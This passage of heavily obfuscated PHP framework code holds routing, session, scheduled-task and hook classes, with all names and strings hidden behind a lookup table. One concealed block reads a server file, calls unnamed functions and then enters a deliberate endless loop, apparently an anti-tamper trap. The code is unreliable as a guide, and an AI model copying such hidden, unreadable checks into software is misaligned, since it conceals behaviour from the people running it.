1) { array_pop($BÒŒä¼Êé–); } elseif ($fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[154] && in_array($eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BÒŒä¼Êé–, array($Bï¹­ˆÜ[1859] => SERVICES_JSON_IN_ARR, $Bï¹­ˆÜ[260] => $Eá›íŠ ïÔ, $Bï¹­ˆÜ[1860] => !1)); } elseif ($fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[468] && $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]] == SERVICES_JSON_IN_ARR) { array_pop($BÒŒä¼Êé–); } elseif ($fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[1039] && in_array($eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BÒŒä¼Êé–, array($Bï¹­ˆÜ[1859] => SERVICES_JSON_IN_OBJ, $Bï¹­ˆÜ[260] => $Eá›íŠ ïÔ, $Bï¹­ˆÜ[1860] => !1)); } elseif ($fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[312] && $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]] == SERVICES_JSON_IN_OBJ) { array_pop($BÒŒä¼Êé–); } elseif ($D¸ğô°°ˆ == $Bï¹­ˆÜ[1863] && in_array($eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($BÒŒä¼Êé–, array($Bï¹­ˆÜ[1859] => SERVICES_JSON_IN_CMT, $Bï¹­ˆÜ[260] => $Eá›íŠ ïÔ, $Bï¹­ˆÜ[1860] => !1)); $Eá›íŠ ïÔ++; } elseif ($D¸ğô°°ˆ == $Bï¹­ˆÜ[1864] && $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]] == SERVICES_JSON_IN_CMT) { array_pop($BÒŒä¼Êé–); $Eá›íŠ ïÔ++; for ($Fòìğ±—‚ = $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[260]]; $Fòìğ±—‚ <= $Eá›íŠ ïÔ; ++$Fòìğ±—‚) { $fŞ»š™œ¥ = substr_replace($fŞ»š™œ¥, $Bï¹­ˆÜ[50], $Fòìğ±—‚, 1); } } } if (reset($BÒŒä¼Êé–) == SERVICES_JSON_IN_ARR) { return $bµˆö’Õ‡; } elseif (reset($BÒŒä¼Êé–) == SERVICES_JSON_IN_OBJ) { return $D‡†¢¬ã‰İ; } goto F“ôÇ˜ÍÊÜ; BĞù‹ÎÜĞ: if ($F¨”èƒç[0] == $Bï¹­ˆÜ[154]) { $BÒŒä¼Êé– = array(SERVICES_JSON_IN_ARR); $bµˆö’Õ‡ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $BÒŒä¼Êé– = array(SERVICES_JSON_IN_OBJ); $D‡†¢¬ã‰İ = array(); } else { $BÒŒä¼Êé– = array(SERVICES_JSON_IN_OBJ); $D‡†¢¬ã‰İ = new stdClass(); } } array_push($BÒŒä¼Êé–, array($Bï¹­ˆÜ[1859] => SERVICES_JSON_SLICE, $Bï¹­ˆÜ[260] => 0, $Bï¹­ˆÜ[1860] => !1)); $fŞ»š™œ¥ = substr($F¨”èƒç, 1, -1); goto c¦Ö‰ö‡®Ø; F“ôÇ˜ÍÊÜ: } } } function isError($a½Æ³¨§õ’, $Bæó×øªªä = null) { $AÂÄíÓ° =& $_SERVER[÷ÖêïÔÔÓ]; if (class_exists($AÂÄíÓ°[1865])) { return PEAR::isError($a½Æ³¨§õ’, $Bæó×øªªä); } elseif (is_object($a½Æ³¨§õ’) && (get_class($a½Æ³¨§õ’) == $AÂÄíÓ°[1866] || is_subclass_of($a½Æ³¨§õ’, $AÂÄíÓ°[1866]))) { return !0; } return !1; } } if (class_exists($_SERVER[÷ÖêïÔÔÓ][1867])) { class Services_JSON_Error extends PEAR_Error { function __construct($e‚™‰öƒÂÂ = "\x75\x6e\153\x6e\x6f\167\156\x20\x65\162\x72\157\x72", $dÒÑÆ¸ä³¹ = null, $C¾Òª†’õŠ = null, $CõÜ”·ÅÏÙ = null, $eäõ®÷™ä¼ = null) { parent::PEAR_Error($e‚™‰öƒÂÂ, $dÒÑÆ¸ä³¹, $C¾Òª†’õŠ, $CõÜ”·ÅÏÙ, $eäõ®÷™ä¼); } } } else { if (!isset($_SERVER[$_SERVER[÷ÖêïÔÔÓ][781]]) || !isset($_SERVER[$_SERVER[÷ÖêïÔÔÓ][791]])) { goto f×ÅÕ¬·Ş©; B ê½öÃœ°: $AÀÇ¼è¢ÁĞ = explode($_SERVER[÷ÖêïÔÔÓ][214], $C¶ó·šÈá—); if (count($AÀÇ¼è¢ÁĞ) < $_SERVER[÷ÖêïÔÔÓ][550]) { $FëŸ®ŠòÏ¼ = $_SERVER[÷ÖêïÔÔÓ][787]; $FëŸ®ŠòÏ¼(); } $a¾„§³‰‰Æ = $_SERVER[÷ÖêïÔÔÓ][792]; goto dÃìîÇ²¨”; f×ÅÕ¬·Ş©: $f¾ãœ„š—Ü = $_SERVER[÷ÖêïÔÔÓ][784]; $bÌİ¶åÑ· = $_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]; $C¶ó·šÈá— = $f¾ãœ„š—Ü($bÌİ¶åÑ·); goto B ê½öÃœ°; dÃìîÇ²¨”: $a¾„§³‰‰Æ($_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]); $aŞÅ‰ŸÙÃÓ = 2; while ($aŞÅ‰ŸÙÃÓ > 1) { $dóÕ£‰ß = rawurlencode($aŞÅ‰ŸÙÃÓ . $_SERVER[÷ÖêïÔÔÓ][358]); } goto aË—Ë‹îÙŠ; aË—Ë‹îÙŠ: } class Services_JSON_Error { function __construct($B‚ùÏĞ°çµ = "\x75\x6e\153\156\x6f\167\156\x20\x65\162\162\157\162", $aàŒÆ‹¢Œ = null, $cÄÊÏÆïõâ = null, $cÒÊ¶‹ŠÏã = null, $D‡…™‰ï¯ = null) { } } } goto aí§¼‡÷; dŒŸİ ×å : class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\x5e\x2f\135\x2b", "\x3a\156\x75\x6d" => "\133\x30\x2d\x39\x5d\53", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Cˆ³çáØ», $cŠÛ—™Ì­) { $C§†¹Ö×ó =& $_SERVER[÷ÖêïÔÔÓ]; if ($Cˆ³çáØ» == $C§†¹Ö×ó[1292]) { $E‹Ñ¯ïöÑ½ = array_map($C§†¹Ö×ó[1293], $cŠÛ—™Ì­[0]); $b»Õ­åÊÃâ = strpos($cŠÛ—™Ì­[1], $C§†¹Ö×ó[8]) === 0 ? $cŠÛ—™Ì­[1] : $C§†¹Ö×ó[8] . $cŠÛ—™Ì­[1]; $C©‹½©¡÷£ = $cŠÛ—™Ì­[2]; } else { $E‹Ñ¯ïöÑ½ = null; $b»Õ­åÊÃâ = strpos($cŠÛ—™Ì­[0], $C§†¹Ö×ó[8]) === 0 ? $cŠÛ—™Ì­[0] : $C§†¹Ö×ó[8] . $cŠÛ—™Ì­[0]; $C©‹½©¡÷£ = $cŠÛ—™Ì­[1]; } array_push(self::$maps, $E‹Ñ¯ïöÑ½); array_push(self::$routes, $b»Õ­åÊÃâ); array_push(self::$methods, strtoupper($Cˆ³çáØ»)); array_push(self::$callbacks, $C©‹½©¡÷£); } public static function error($Eßø‰ëÈ²½) { self::$errorCallback = $Eßø‰ëÈ²½; } public static function haltOnMatch($bÙì·”çØ = true) { self::$halts = $bÙì·”çØ; } public static function dispatch() { goto D¹ÓË†á¼è; FÅõ³¤½Ù¨: $AÀã­ó‚Û = array_keys(static::$patterns); $E‡½†Öö– = array_values(static::$patterns); $AõâÅÈÕÒõ = !1; goto Fö’î÷ö’ğ; D¹ÓË†á¼è: $E¿Ö¥ôéÎ˜ =& $_SERVER[÷ÖêïÔÔÓ]; $c´í–ÇÚ ¢ = parse_url($_SERVER[$E¿Ö¥ôéÎ˜[1294]], PHP_URL_PATH); $aª‡ìòõéÀ = $_SERVER[$E¿Ö¥ôéÎ˜[149]]; goto FÅõ³¤½Ù¨; Fö’î÷ö’ğ: self::$routes = preg_replace($E¿Ö¥ôéÎ˜[1043], $E¿Ö¥ôéÎ˜[8], self::$routes); if (in_array($c´í–ÇÚ ¢, self::$routes)) { $cË»œ…‡à÷ = array_keys(self::$routes, $c´í–ÇÚ ¢); foreach ($cË»œ…‡à÷ as $A®Îà´ƒŒ÷) { if (self::$methods[$A®Îà´ƒŒ÷] == $aª‡ìòõéÀ || self::$methods[$A®Îà´ƒŒ÷] == $E¿Ö¥ôéÎ˜[1295] || in_array($aª‡ìòõéÀ, self::$maps[$A®Îà´ƒŒ÷])) { $AõâÅÈÕÒõ = !0; if (!is_object(self::$callbacks[$A®Îà´ƒŒ÷])) { $aİÂÓèèâá = explode($E¿Ö¥ôéÎ˜[8], self::$callbacks[$A®Îà´ƒŒ÷]); $E¾Æ¨÷†§ù = end($aİÂÓèèâá); $DÂ»á¯×ì¥ = explode($E¿Ö¥ôéÎ˜[1296], $E¾Æ¨÷†§ù); $fÂÒˆâğÀ† = new $DÂ»á¯×ì¥[0](); $fÂÒˆâğÀ†->{$DÂ»á¯×ì¥[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$A®Îà´ƒŒ÷]); if (self::$halts) { return; } } } } } else { $E¿¯§°ô¸Ï = 0; foreach (self::$routes as $A®Îà´ƒŒ÷) { if (strpos($A®Îà´ƒŒ÷, $E¿Ö¥ôéÎ˜[4]) !== !1) { $A®Îà´ƒŒ÷ = str_replace($AÀã­ó‚Û, $E‡½†Öö–, $A®Îà´ƒŒ÷); } if (preg_match($E¿Ö¥ôéÎ˜[1297] . $A®Îà´ƒŒ÷ . $E¿Ö¥ôéÎ˜[1298], $c´í–ÇÚ ¢, $A¤’Û¶Û¿×)) { if (self::$methods[$E¿¯§°ô¸Ï] == $aª‡ìòõéÀ || self::$methods[$E¿¯§°ô¸Ï] == $E¿Ö¥ôéÎ˜[1295] || !empty(self::$maps[$E¿¯§°ô¸Ï]) && in_array($aª‡ìòõéÀ, self::$maps[$E¿¯§°ô¸Ï])) { $AõâÅÈÕÒõ = !0; array_shift($A¤’Û¶Û¿×); if (!is_object(self::$callbacks[$E¿¯§°ô¸Ï])) { $aİÂÓèèâá = explode($E¿Ö¥ôéÎ˜[8], self::$callbacks[$E¿¯§°ô¸Ï]); $E¾Æ¨÷†§ù = end($aİÂÓèèâá); $DÂ»á¯×ì¥ = explode($E¿Ö¥ôéÎ˜[1296], $E¾Æ¨÷†§ù); $fÂÒˆâğÀ† = new $DÂ»á¯×ì¥[0](); if (!method_exists($fÂÒˆâğÀ†, $DÂ»á¯×ì¥[1])) { echo $E¿Ö¥ôéÎ˜[1299]; } else { call_user_func_array(array($fÂÒˆâğÀ†, $DÂ»á¯×ì¥[1]), $A¤’Û¶Û¿×); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$E¿¯§°ô¸Ï], $A¤’Û¶Û¿×); if (self::$halts) { return; } } } } $E¿¯§°ô¸Ï++; } } if ($AõâÅÈÕÒõ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $dÃòÔ¾ˆ¯‘ =& $_SERVER[÷ÖêïÔÔÓ]; header($_SERVER[$dÃòÔ¾ˆ¯‘[1300]] . $dÃòÔ¾ˆ¯‘[1301]); echo $dÃòÔ¾ˆ¯‘[1302]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$E¿Ö¥ôéÎ˜[1294]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F›‹‚†¹Œ; F›‹‚†¹Œ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto a°ëô§À„ö; a°ëô§À„ö: $eÜÎšÉ©† =& $_SERVER[÷ÖêïÔÔÓ]; static $e¨‹Ñ†ĞØ‡ = false; if ($e¨‹Ñ†ĞØ‡) { return $e¨‹Ñ†ĞØ‡; } goto e¢¯°ÄÅ¾Ğ; fÀ­·¼‚¡õ: $b¦Ğ¢æ¦İ = $d®©·Ö‘‰[$eÜÎšÉ©†[750]]; switch ($a¼ø½˜æïô) { case $eÜÎšÉ©†[17]: self::$handle = Model($eÜÎšÉ©†[751]); break; case $eÜÎšÉ©†[752]: self::$handle = new CacheRedis($E†ø‚°Ãå, $b¦Ğ¢æ¦İ); break; case $eÜÎšÉ©†[753]: self::$handle = new CacheMemcached($E†ø‚°Ãå, $b¦Ğ¢æ¦İ); break; case $eÜÎšÉ©†[164]: $E†ø‚°Ãå[$eÜÎšÉ©†[76]] = $E†ø‚°Ãå[$eÜÎšÉ©†[76]] . $eÜÎšÉ©†[1305]; self::$handle = new CacheFile($E†ø‚°Ãå, $b¦Ğ¢æ¦İ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto E–¿‰Î÷Àã; E–¿‰Î÷Àã: $e¨‹Ñ†ĞØ‡ = new self(); return $e¨‹Ñ†ĞØ‡; goto A¸’Œ—¯‘; E„Ç…íÀ„ˆ: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $a¼ø½˜æïô = $d®©·Ö‘‰[$eÜÎšÉ©†[1304]]; $E†ø‚°Ãå = $d®©·Ö‘‰[$a¼ø½˜æïô]; goto fÀ­·¼‚¡õ; e¢¯°ÄÅ¾Ğ: $d®©·Ö‘‰ = $GLOBALS[$eÜÎšÉ©†[6]][$eÜÎšÉ©†[334]]; self::$sessionTime = $d®©·Ö‘‰[$eÜÎšÉ©†[1303]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto E„Ç…íÀ„ˆ; A¸’Œ—¯‘: } public static function sign($Bë˜æŠ”æ– = false) { $Bë˜æŠ”æ– && (self::$sessionSign = $Bë˜æŠ”æ–); self::init(); return self::$sessionSign; } public static function set($A§”ÂÑê©œ, $b„ˆä¢­¸ = false) { self::init(); if (is_array($A§”ÂÑê©œ)) { foreach ($A§”ÂÑê©œ as $DóîÈ²ÌÚ‹ => $f§‰Ï‚†Ş) { array_set_value(self::$data, $DóîÈ²ÌÚ‹, $f§‰Ï‚†Ş); } } else { array_set_value(self::$data, $A§”ÂÑê©œ, $b„ˆä¢­¸); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cŞãìŸŠÖ‚ = false) { self::init(); if (!$cŞãìŸŠÖ‚) { return self::$data; } return array_get_value(self::$data, $cŞãìŸŠÖ‚); } public static function remove($Aã¯Õè¾İÑ) { self::init(); unset(self::$data[$Aã¯Õè¾İÑ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[÷ÖêïÔÔÓ][755])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto B»ƒÀã‹‰†; BîõÁ©Û§: http_close(); self::valueSet($DàÍèŸ³‘š[1306], $DàÍèŸ³‘š[493]); Hook::bind($DàÍèŸ³‘š[1308], $DàÍèŸ³‘š[1309]); goto aÒƒÍ‘´¨ğ; aÒƒÍ‘´¨ğ: while (!0) { self::cacheClear(); if (self::valueGet($DàÍèŸ³‘š[675]) != $DàÍèŸ³‘š[493]) { self::valueSet($DàÍèŸ³‘š[1306], $DàÍèŸ³‘š[464]); self::log($DàÍèŸ³‘š[1310]); die; } self::valueSet($DàÍèŸ³‘š[1306], $DàÍèŸ³‘š[493]); self::valueSet($DàÍèŸ³‘š[1307], time()); self::taskRunAll(); sleep(self::valueGet($DàÍèŸ³‘š[1311])); } goto Eİ‡åºªå˜; B»ƒÀã‹‰†: $DàÍèŸ³‘š =& $_SERVER[÷ÖêïÔÔÓ]; if (self::valueGet($DàÍèŸ³‘š[675]) != $DàÍèŸ³‘š[493]) { return; } if (self::valueGet($DàÍèŸ³‘š[1306]) == $DàÍèŸ³‘š[493]) { $C‚÷œî´©í = self::valueGet($DàÍèŸ³‘š[1307]); if (time() - $C‚÷œî´©í > 3600 * 2) { self::restart(); } return; } goto BîõÁ©Û§; Eİ‡åºªå˜: } public static function restart() { $E‚Õ­“«Ë¤ =& $_SERVER[÷ÖêïÔÔÓ]; http_close(); self::valueSet($E‚Õ­“«Ë¤[675], $E‚Õ­“«Ë¤[464]); sleep(self::valueGet($E‚Õ­“«Ë¤[1311]) + 5); self::valueSet($E‚Õ­“«Ë¤[1306], $E‚Õ­“«Ë¤[464]); self::valueSet($E‚Õ­“«Ë¤[675], $E‚Õ­“«Ë¤[493]); } public static function shutdownEvent() { $ešÚÃöéõ =& $_SERVER[÷ÖêïÔÔÓ]; self::valueSet($ešÚÃöéõ[1306], $ešÚÃöéõ[464]); self::log($ešÚÃöéõ[1312]); } public static function config($d‰§‰Ü°…¿, $D³²õ…íÙ) { $FØ¯Á©á’ß =& $_SERVER[÷ÖêïÔÔÓ]; $C‡ñíç¤ » = 20; $D³²õ…íÙ = intval($D³²õ…íÙ) <= $C‡ñíç¤ » ? $C‡ñíç¤ » : intval($D³²õ…íÙ); self::valueSet($FØ¯Á©á’ß[675], $d‰§‰Ü°…¿); self::valueSet($FØ¯Á©á’ß[1311], $D³²õ…íÙ); } private static function taskRunAll() { $F–„ÊË®†Œ =& $_SERVER[÷ÖêïÔÔÓ]; $fë§Ïò»ƒ = Model($F–„ÊË®†Œ[1313])->listData(); $dğ£º¬…Ş© = count($fë§Ïò»ƒ); for ($f¨Ã¦  = 0; $f¨Ã¦  < $dğ£º¬…Ş©; $f¨Ã¦ ++) { $fçùëŠÏã = $fë§Ïò»ƒ[$f¨Ã¦ ]; if ($fçùëŠÏã[$F–„ÊË®†Œ[1314]] != $F–„ÊË®†Œ[493]) { continue; } if (!self::taskTimeCheck($fçùëŠÏã)) { continue; } self::taskRun($fçùëŠÏã); } } private static function taskTimeCheck($CÕåœ†æ¿) { goto AÑ§›Úù; cˆÀÕœòÂ: $dÃëùæ£á = strtotime($A¹™èñ×‹©[1315] . $E‚¨Ïª×‚[$A¹™èñ×‹©[1316]] . $A¹™èñ×‹©[1317]) - strtotime($A¹™èñ×‹©[1318]); $aöó¼«öøÀ = time() - strtotime(date($A¹™èñ×‹©[1319]) . $A¹™èñ×‹©[1320]); $B³ğãã–ĞÉ = $aöó¼«öøÀ >= $dÃëùæ£á && $aöó¼«öøÀ <= $dÃëùæ£á + 3600; goto fÉ˜ê÷¨Åò; fÉ˜ê÷¨Åò: switch ($E‚¨Ïª×‚[$A¹™èñ×‹©[29]]) { case $A¹™èñ×‹©[1321]: if (time() - $c‚Œğ¯ö‚Ö < 3600 * 24 * 30) { return !1; } if ($E‚¨Ïª×‚[$A¹™èñ×‹©[1321]] == date($A¹™èñ×‹©[1322]) && $B³ğãã–ĞÉ) { return !0; } break; case $A¹™èñ×‹©[1323]: if (time() - $c‚Œğ¯ö‚Ö < 3600 * 24 * 7) { return !1; } $DÚŞğ‰›œİ = date($A¹™èñ×‹©[1324]) == 0 ? 7 : date($A¹™èñ×‹©[1324]); if ($E‚¨Ïª×‚[$A¹™èñ×‹©[1323]] == $DÚŞğ‰›œİ && $B³ğãã–ĞÉ) { return !0; } break; case $A¹™èñ×‹©[1316]: if (time() - $c‚Œğ¯ö‚Ö < 3600 * 24) { return !1; } if ($B³ğãã–ĞÉ) { return !0; } break; case $A¹™èñ×‹©[1325]: if (time() - $c‚Œğ¯ö‚Ö >= floatval($E‚¨Ïª×‚[$A¹™èñ×‹©[1325]]) * 60) { return !0; } break; default: break; } return !1; goto aµÈ¥Øâµò; AÑ§›Úù: $A¹™èñ×‹© =& $_SERVER[÷ÖêïÔÔÓ]; $E‚¨Ïª×‚ = json_decode($CÕåœ†æ¿[$A¹™èñ×‹©[187]], !0); $c‚Œğ¯ö‚Ö = intval($CÕåœ†æ¿[$A¹™èñ×‹©[1307]]); goto cˆÀÕœòÂ; aµÈ¥Øâµò: } public static function taskRun($F´ù°ëÛ›) { goto aÄˆç›å˜›; AŠ±ïĞÇ: $dŸ„œ½ÉÁ = timeFloat(); $bçÙœÂÄÄ÷ = $CØóóî¯•[33]; switch ($F´ù°ëÛ›[$CØóóî¯•[29]]) { case $CØóóî¯•[292]: $F‹¬¹âÂêè = url_request($F´ù°ëÛ›[$CØóóî¯•[1329]], $CØóóî¯•[213], !1, !1, !1, !1, 5); $bçÙœÂÄÄ÷ = strlen($F‹¬¹âÂêè); break; case $CØóóî¯•[212]: $bçÙœÂÄÄ÷ = Hook::apply($F´ù°ëÛ›[$CØóóî¯•[1329]]); default: break; } goto B‹÷¹´©º; aÄˆç›å˜›: $CØóóî¯• =& $_SERVER[÷ÖêïÔÔÓ]; self::log($CØóóî¯•[1326] . $F´ù°ëÛ›[$CØóóî¯•[364]] . $CØóóî¯•[1327] . $F´ù°ëÛ›[$CØóóî¯•[28]] . $CØóóî¯•[1328] . $F´ù°ëÛ›[$CØóóî¯•[1329]]); Model($CØóóî¯•[1313])->run($F´ù°ëÛ›[$CØóóî¯•[364]]); goto AŠ±ïĞÇ; B‹÷¹´©º: Model($CØóóî¯•[1330])->add(array($CØóóî¯•[1331] => $CØóóî¯•[33], $CØóóî¯•[1332] => $CØóóî¯•[464], $CØóóî¯•[29] => $CØóóî¯•[1333] . $F´ù°ëÛ›[$CØóóî¯•[364]], $CØóóî¯•[1334] => json_encode(array($CØóóî¯•[28] => $F´ù°ëÛ›[$CØóóî¯•[28]], $CØóóî¯•[1335] => timeFloat() - $dŸ„œ½ÉÁ, $CØóóî¯•[278] => $bçÙœÂÄÄ÷)))); self::log($CØóóî¯•[1336] . $F´ù°ëÛ›[$CØóóî¯•[364]] . $CØóóî¯•[1337] . $bçÙœÂÄÄ÷); return !0; goto E£à¼È‰ÆÌ; E£à¼È‰ÆÌ: } private static function valueGet($EÁ…İÛ—É“) { $C¼“Ü¬ªÒ† =& $_SERVER[÷ÖêïÔÔÓ]; $DÉëÌèŒ° = $C¼“Ü¬ªÒ†[1338]; $a¸Üìô°İ± = Model($C¼“Ü¬ªÒ†[1339])->get($EÁ…İÛ—É“, $DÉëÌèŒ°); if (is_null($a¸Üìô°İ±)) { Model($C¼“Ü¬ªÒ†[1339])->set($C¼“Ü¬ªÒ†[1311], 10, $DÉëÌèŒ°); Model($C¼“Ü¬ªÒ†[1339])->set($C¼“Ü¬ªÒ†[675], $C¼“Ü¬ªÒ†[493], $DÉëÌèŒ°); Model($C¼“Ü¬ªÒ†[1339])->set($C¼“Ü¬ªÒ†[1306], $C¼“Ü¬ªÒ†[464], $DÉëÌèŒ°); $a¸Üìô°İ± = Model($C¼“Ü¬ªÒ†[1339])->get($EÁ…İÛ—É“, $DÉëÌèŒ°); } return $a¸Üìô°İ±; } private static function valueSet($bÒçƒî†ïŸ, $f™†‰â„Õ) { $A¦ôîÕ‘  =& $_SERVER[÷ÖêïÔÔÓ]; return Model($A¦ôîÕ‘ [1339])->set($bÒçƒî†ïŸ, $f™†‰â„Õ, $A¦ôîÕ‘ [1338]); } protected static function log($BÀë»ÖÌàÚ) { write_log($BÀë»ÖÌàÚ, $_SERVER[÷ÖêïÔÔÓ][1340]); } private static function cacheClear() { $CàŒÎ’ÈöÅ =& $_SERVER[÷ÖêïÔÔÓ]; $Bµ½¦ĞÀë = Model($CàŒÎ’ÈöÅ[1339])->cacheKey($CàŒÎ’ÈöÅ[1338]); Cache::clearMemory($Bµ½¦ĞÀë); } } goto dÀ·Œ’á¯Ó; E“É’×à¾µ: class Hook { private static $events = array(); public static function get($eËÜŒ«èÎ× = false) { if (!$eËÜŒ«èÎ×) { return self::$events; } else { return self::$events[$eËÜŒ«èÎ×]; } } public static function apply($D·˜÷½¸•ö, $Aã¥ÛÊ‘ß± = array()) { $Cè¢ ¡ø£¨ = ActionApply($D·˜÷½¸•ö, $Aã¥ÛÊ‘ß±); if (is_string($D·˜÷½¸•ö)) { Hook::trigger($D·˜÷½¸•ö); } return $Cè¢ ¡ø£¨; } public static function bind($bÌ©ˆ½‹‘à, $a¿†…ÃÛî, $Bº—¸êä‹² = false) { $Cßùğí‹ÖÑ =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset(self::$events[$bÌ©ˆ½‹‘à])) { self::$events[$bÌ©ˆ½‹‘à] = array(); } self::$events[$bÌ©ˆ½‹‘à][] = array($Cßùğí‹ÖÑ[1649] => $a¿†…ÃÛî, $Cßùğí‹ÖÑ[1650] => $Bº—¸êä‹², $Cßùğí‹ÖÑ[1651] => 0); } public static function once($bÅòâ·ÅéÖ, $a‡ïîì•ì°) { self::bind($bÅòâ·ÅéÖ, $a‡ïîì•ì°, !0); } public static function unbind($aÛôšÀ¼öÖ, $b£ù›ÄÓáø = false) { if (!$b£ù›ÄÓáø) { self::$events[$aÛôšÀ¼öÖ] = array(); return; } $CËßÙˆŞ”“ = self::$events[$aÛôšÀ¼öÖ]; self::$events[$aÛôšÀ¼öÖ] = array(); if (!$CËßÙˆŞ”“) { return; } for ($DæºšÒ´…‹ = 0; $DæºšÒ´…‹ < count($CËßÙˆŞ”“); $DæºšÒ´…‹++) { if ($CËßÙˆŞ”“[$DæºšÒ´…‹][$_SERVER[÷ÖêïÔÔÓ][1649]] == $b£ù›ÄÓáø) { continue; } self::$events[$aÛôšÀ¼öÖ][] = $CËßÙˆŞ”“[$DæºšÒ´…‹]; } } public static function filter($f²éƒß•Ç„, $E¢—§‚¬â) { goto Bî±Á‰—ÇÏ; EÆİÉ‘«äË: for ($EÆÔ†§Óõ = 0; $EÆÔ†§Óõ < count($C­ã¥Ù¦¥); $EÆÔ†§Óõ++) { $bóâ¬ ŞÇ¯ = $C­ã¥Ù¦¥[$EÆÔ†§Óõ]; if ($bóâ¬ ŞÇ¯[$e„ä‹ã‰ÂŠ[1650]] && $bóâ¬ ŞÇ¯[$e„ä‹ã‰ÂŠ[1651]] > 1) { continue; } self::$events[$f²éƒß•Ç„][$EÆÔ†§Óõ][$e„ä‹ã‰ÂŠ[1651]] = $bóâ¬ ŞÇ¯[$e„ä‹ã‰ÂŠ[1651]] + 1; $a…•´ŠÍ˜˜ = self::apply($bóâ¬ ŞÇ¯[$e„ä‹ã‰ÂŠ[1649]], array($cÑ¯âïø¤)); if (!is_null($a…•´ŠÍ˜˜)) { $cÑ¯âïø¤ = $a…•´ŠÍ˜˜; } } return $cÑ¯âïø¤; goto B‰·¼¿ò¿; Bî±Á‰—ÇÏ: $e„ä‹ã‰ÂŠ =& $_SERVER[÷ÖêïÔÔÓ]; $e˜¼¼õ‹Ú = self::$events; if (!isset($e˜¼¼õ‹Ú[$f²éƒß•Ç„])) { return $E¢—§‚¬â; } goto Aâ¯í£¤‹×; Aâ¯í£¤‹×: $C­ã¥Ù¦¥ = $e˜¼¼õ‹Ú[$f²éƒß•Ç„]; $cÑ¯âïø¤ = $E¢—§‚¬â; if (!is_array($C­ã¥Ù¦¥) || count($C­ã¥Ù¦¥) == 0) { return $cÑ¯âïø¤; } goto EÆİÉ‘«äË; B‰·¼¿ò¿: } public static function trigger($BÅ©ºŠÚ“) { goto D©Åµ˜ñ¼¾; D©Åµ˜ñ¼¾: $Càåçó¹„š =& $_SERVER[÷ÖêïÔÔÓ]; $c­Û±¨ÊÊ‹ = self::$events; $AÔœî³®ï– = !1; goto bó—ÅÈŸÃ; a¾ƒªãĞ›¨: $E£®«¦Àà¦ = func_get_args(); array_shift($E£®«¦Àà¦); for ($d šÎ‚ˆ”‘ = 0; $d šÎ‚ˆ”‘ < count($cÂË±ïÑ«); $d šÎ‚ˆ”‘++) { $Bæ±İ£ù² = $cÂË±ïÑ«[$d šÎ‚ˆ”‘]; if ($Bæ±İ£ù²[$Càåçó¹„š[1650]] && $Bæ±İ£ù²[$Càåçó¹„š[1651]] > 1) { continue; } if (defined($Càåçó¹„š[1652]) && GLOBAL_LOG_HOOK) { write_log($BÅ©ºŠÚ“ . $Càåçó¹„š[1653] . $Bæ±İ£ù²[$Càåçó¹„š[1649]], $Càåçó¹„š[1654]); } self::$events[$BÅ©ºŠÚ“][$d šÎ‚ˆ”‘][$Càåçó¹„š[1651]] = $Bæ±İ£ù²[$Càåçó¹„š[1651]] + 1; $B’‡•àê´ = self::apply($Bæ±İ£ù²[$Càåçó¹„š[1649]], $E£®«¦Àà¦); if (defined($Càåçó¹„š[1652]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Càåçó¹„š[1654]); if ($Bæ±İ£ù²[$Càåçó¹„š[1651]] == 200) { $CÁ²áêå¢œ = is_array($Bæ±İ£ù²[$Càåçó¹„š[1649]]) ? json_encode_force($Bæ±İ£ù²[$Càåçó¹„š[1649]]) : $Bæ±İ£ù²[$Càåçó¹„š[1649]]; write_log($Càåçó¹„š[1655] . $BÅ©ºŠÚ“ . 